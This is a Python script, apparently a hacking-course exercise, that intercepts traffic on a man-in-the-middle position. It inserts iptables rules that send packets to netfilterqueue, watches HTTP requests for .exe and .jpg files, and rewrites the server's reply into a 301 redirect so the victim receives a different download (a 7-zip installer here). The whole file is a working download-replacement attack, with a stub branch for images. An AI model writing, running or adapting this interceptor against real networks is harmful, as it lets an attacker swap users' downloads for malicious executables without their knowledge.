#!/usr/bin/env python#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
from scapy.layers import http
import subprocess
import argparse

exe_ack_list = []
jpg_ack_list = []

# add command line arguments to choose file type to replace, maybe name of file to replace?

def get_arguments():
    parser = argparse.ArgumentParser()
    # parser.add_argument("-u", "--url", dest="url", help="URL to Spoof")
    # parser.add_argument("-w", "--webserver", dest="webserver", help="New webserver ip")
    parser.add_argument("-d", "--debug", dest="debug", action="store_true", help=argparse.SUPPRESS)
    options = parser.parse_args()
    # if not options.url:
    #     # handle error
    #     parser.error("[-] Please specify a url to spoof, use --help for more info")
    # if not options.webserver:
    #     # handle error
    #     parser.error("[-] Please specify a new webserver [X.X.X.X] , use --help for more info")
    return options

def process_packet(packet):
    # options = get_arguments()
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # print(scapy_packet.show())
        if scapy_packet[scapy.TCP].dport == 80:
            print(scapy_packet.show())
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                exe_ack_list.append(scapy_packet[scapy.TCP].ack)
            elif ".jpg" in scapy_packet[scapy.Raw].load:
                print("[+] jpg Request")
                jpg_ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in exe_ack_list:
                exe_ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file with exe")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.7-zip.org/a/7z1900.exe\n\n"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                
                packet.set_payload(str(scapy_packet))
            elif scapy_packet[scapy.TCP].seq in jpg_ack_list:
                jpg_ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file with jpg")

    packet.accept()

def set_iptables(debug):
    if debug:
        subprocess.call(["iptables","-I","OUTPUT","-j","NFQUEUE","--queue-num","0"])
        subprocess.call(["iptables","-I","INPUT","-j","NFQUEUE","--queue-num","0"])
    else:
        subprocess.call(["iptables","-I","FORWARD","-j","NFQUEUE","--queue-num","0"])

options = get_arguments()
set_iptables(options.debug)
print("[+] Setting up iptables...")
print("[+] Done.")
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    # clear queue
    print("[+] Flushing iptables")
    subprocess.call(["iptables","--flush"])
    print("[+] Done.")